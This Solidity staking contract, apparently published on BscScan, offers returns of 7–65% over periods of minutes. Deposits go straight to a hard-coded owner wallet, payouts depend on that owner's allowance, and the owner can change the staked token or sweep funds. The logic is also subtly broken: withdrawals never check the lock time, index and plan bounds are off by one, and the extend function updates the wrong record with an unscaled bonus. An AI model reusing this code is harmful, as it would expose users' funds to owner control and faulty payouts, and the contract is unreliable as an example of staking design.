/**
 *Submitted for verification at BscScan.com on 2021-11-23
*/

/**
 *Submitted for verification at BscScan.com on 2021-11-23
*/

pragma solidity ^0.8.9;

// SPDX-License-Identifier: MIT

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract StakeContract {
    using SafeMath for uint256;

    //Variables
    IBEP20 public stakeToken;
    address payable public owner;
    uint256 public totalUniqueStakers;
    uint256 public totalStaked;
    uint256 public minStake;
    uint256 public constant percentDivider = 100;
    
    //arrays
    uint256[5] public percentages = [7, 17, 35, 45, 65];
    uint256[5] public durations = [30 minutes, 60 minutes, 90 minutes, 180 minutes, 365 minutes];

    
    //structures
    struct Stake {
        uint256 stakeTime;
        uint256 withdrawTime;
        uint256 amount;
        uint256 bonus;
        uint256 plan;
        bool withdrawan;
        bool unstaked;
    }

    struct User {
        uint256 totalstakeduser;
        uint256 stakecount;
        uint256 claimedstakeTokens;
        uint256 unStakedTokens;
        mapping(uint256 => Stake) stakerecord;
    }

    //mappings
    mapping(address => User) public users;
    mapping(address => bool) public uniqueStaker;

    //modifiers
    modifier onlyOwner() {
        require(msg.sender == owner, "Ownable: Not an owner");
        _;
    }

    //events
    event Staked(
        address indexed _user,
        uint256 indexed _amount,
        uint256 indexed _Time
    );

    event UnStaked(
        address indexed _user,
        uint256 indexed _amount,
        uint256 indexed _Time
    );

    event Withdrawn(
        address indexed _user,
        uint256 indexed _amount,
        uint256 indexed _Time
    );

    event ExtenderStake(
        address indexed _user,
        uint256 indexed _amount,
        uint256 indexed _Time
    );

    event UNIQUESTAKERS(address indexed _user);

    // constructor
    constructor() {
        owner = payable(0x71495a3fa8093824E7ac896f00b5Dd05C5CA6354);
        stakeToken = IBEP20(0x6F0C374a284C413155Ae74bC05065181bd5A7619);
        minStake = 500;
        minStake = minStake.mul(10**stakeToken.decimals());
    }

    // functions


    //writeable
    function stake(uint256 amount, uint256 plan) public {
        require(plan >= 0 && plan < 6, "put valid plan details");
        require(
            amount >= minStake,
            "cant deposit need to stake more than minimum amount"
        );
        if (!uniqueStaker[msg.sender]) {
            uniqueStaker[msg.sender] = true;
            totalUniqueStakers++;
            emit UNIQUESTAKERS(msg.sender);
        }
        User storage user = users[msg.sender];
        stakeToken.transferFrom(msg.sender, owner, amount);
        user.totalstakeduser += amount;
        user.stakerecord[user.stakecount].plan = plan;
        user.stakerecord[user.stakecount].stakeTime = block.timestamp;
        user.stakerecord[user.stakecount].amount = amount;
        user.stakerecord[user.stakecount].withdrawTime = block.timestamp.add(durations[plan]);
        user.stakerecord[user.stakecount].bonus = amount.mul(percentages[plan]).div(percentDivider);
        user.stakecount++;
        totalStaked += amount;
        emit Staked(msg.sender, amount, block.timestamp);
    }

    function withdraw(uint256 count) public {
        User storage user = users[msg.sender];
        require(user.stakecount >= count, "Invalid Stake index");
        require(
            !user.stakerecord[count].withdrawan,
            " withdraw completed "
        );
        require(
            !user.stakerecord[count].unstaked,
            " withdraw completed "
        );
        stakeToken.transferFrom(
            owner,
            msg.sender,
            user.stakerecord[count].amount
        );
        stakeToken.transferFrom(
            owner,
            msg.sender,
            user.stakerecord[count].bonus
        );
        user.claimedstakeTokens += user.stakerecord[count].amount;
        user.claimedstakeTokens += user.stakerecord[count].bonus;
        user.stakerecord[count].withdrawan = true;
        emit Withdrawn(
            msg.sender,
            user.stakerecord[count].amount,
            block.timestamp);
    }
    function extendStake(uint256 count) public {
        User storage user = users[msg.sender];
        require(user.stakecount >= count, "Invalid Stake index");
        require(user.stakerecord[count].plan < 5, "Can not extend reached Max duration Start a new Stake");
        
        require(
            !user.stakerecord[count].withdrawan,
            " withdraw completed "
        );
        require(
            !user.stakerecord[count].unstaked,
            " unstake completed "
        );
        stakeToken.transferFrom(
            owner,
            msg.sender,
            user.stakerecord[count].bonus
        );
        user.stakerecord[count].plan++;
        user.stakerecord[user.stakecount].withdrawTime = user.stakerecord[count].stakeTime.add(durations[user.stakerecord[count].plan]);
        user.stakerecord[user.stakecount].bonus = (user.stakerecord[count].amount.mul(percentages[user.stakerecord[count].plan])).sub(user.stakerecord[count].bonus);
         emit ExtenderStake(
            msg.sender,
            user.stakerecord[count].amount,
            block.timestamp
        );
    }

    function unstake(uint256 count) public {
        User storage user = users[msg.sender];
        require(user.stakecount >= count, "Invalid Stake index");
        require(
            !user.stakerecord[count].withdrawan,
            " withdraw completed "
        );
        require(
            !user.stakerecord[count].unstaked,
            " unstake completed "
        );
        stakeToken.transferFrom(
            owner,
            msg.sender,
            user.stakerecord[count].amount
        );
        user.unStakedTokens += user.stakerecord[count].amount;
        user.stakerecord[count].unstaked = true;
        emit UnStaked(
            msg.sender,
            user.stakerecord[count].amount,
            block.timestamp
        );
    }

    function changeOwner(address payable _newOwner) external onlyOwner {
        owner = _newOwner;
    }

    function migrateStuckFunds() external onlyOwner {
        owner.transfer(address(this).balance);
    }

    function migratelostToken(address lostToken) external onlyOwner {
        IBEP20(lostToken).transfer(
            owner,
            IBEP20(lostToken).balanceOf(address(this))
        );
    }
    
    function tokenChange(address _addr)external onlyOwner returns(bool){
        
        stakeToken = IBEP20(_addr);
        
        return true;
    }

    //readable
    
    function stakedetails(address add, uint256 count)
        public
        view
        returns (
        // uint256 stakeTime,
        uint256 withdrawTime,
        uint256 amount,
        uint256 bonus,
        uint256 plan,
        bool withdrawan,
        bool unstaked
        )
    {
        return (
            // users[add].stakerecord[count].stakeTime,
            users[add].stakerecord[count].withdrawTime,
            users[add].stakerecord[count].amount,
            users[add].stakerecord[count].bonus,
            users[add].stakerecord[count].plan,
            users[add].stakerecord[count].withdrawan,
            users[add].stakerecord[count].unstaked
        );
    }

    function calculateRewards(uint256 amount, uint256 plan)
        external
        view
        returns (uint256)
    {
        return amount.mul(percentages[plan]).div(percentDivider);
    }

    function currentStaked(address add) external view returns (uint256) {
        uint256 currentstaked;
        for (uint256 i; i < users[add].stakecount; i++) {
            if (!users[add].stakerecord[i].withdrawan) {
                currentstaked += users[add].stakerecord[i].amount;
            }
        }
        return currentstaked;
    }

    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getContractstakeTokenBalance() external view returns (uint256) {
        return stakeToken.allowance(owner, address(this));
    }

    function getCurrentwithdrawTime() external view returns (uint256) {
        return block.timestamp;
    }
}

//library
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}